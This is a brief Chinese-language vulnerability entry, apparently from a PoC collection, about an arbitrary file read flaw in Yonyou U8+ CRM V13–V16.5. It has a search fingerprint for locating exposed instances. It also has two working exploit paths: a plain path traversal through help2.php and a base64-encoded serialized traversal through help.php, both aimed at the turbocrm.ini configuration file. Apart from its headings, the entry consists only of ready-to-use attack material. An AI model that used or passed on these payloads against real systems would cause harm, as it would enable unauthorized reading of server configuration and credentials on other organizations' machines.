# 用友U8+CRMV13-V16.5系统存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-U8CRM"`

**Payload**
```
POC1
/pub/help2.php?key=/../../tsvr/turbocrm.ini
POC2
/pub/help.php?key=YToxOntpOjA7czozMDoiLy4uLy4uLy4uLy4uL3RzdnIvdHVyYm9jcm0uaW5pIjt9
```